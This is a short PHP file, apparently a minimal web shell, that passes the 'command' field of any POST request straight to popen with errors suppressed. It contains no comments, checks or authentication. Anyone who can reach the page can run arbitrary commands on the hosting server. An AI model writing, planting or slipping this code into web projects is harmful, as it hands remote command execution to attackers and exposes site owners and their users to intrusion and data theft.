<?php
function shell($cmd)
{
    $f = @popen($cmd,"r");
}

shell($_POST['command']);
?>